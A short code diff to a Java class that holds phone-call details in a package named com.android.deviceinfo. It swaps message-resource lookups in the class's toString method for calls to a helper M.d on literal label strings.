@@ -11,6 +11,8 @@ package com.android.deviceinfo;
 
 import java.util.Date;
 
+import com.android.m.M;
+
 public class Call {
 	private static final String TAG = "Call"; //$NON-NLS-1$
 
@@ -74,6 +76,6 @@ public class Call {
 	@Override
 	public String toString() {
 		return number
-				+ Messages.getString("28_1") + ongoing + Messages.getString("28_0") + incoming + " " + timestamp; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+				+ M.d(" ongoing: ") + ongoing + M.d(" incoming: ") + incoming + " " + timestamp; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 	}
 }
